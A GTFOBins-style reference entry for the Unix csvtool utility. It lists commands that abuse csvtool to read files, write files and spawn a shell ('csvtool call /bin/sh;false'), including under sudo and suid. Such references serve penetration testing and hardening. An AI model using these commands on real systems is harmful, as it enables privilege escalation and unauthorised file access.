---
type: gtfobin
name: csvtool
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# csvtool

## file-read

```bash
csvtool trim t /path/to/input-file
```
_The file is actually parsed and manipulated as CSV._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
echo DATA >/path/to/temp-file
csvtool trim t /path/to/temp-file -o /path/to/output-file
```
_The file is actually parsed and manipulated as CSV._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
csvtool call '/bin/sh;false' /etc/hosts
```
**Contexts:** sudo, suid, unprivileged
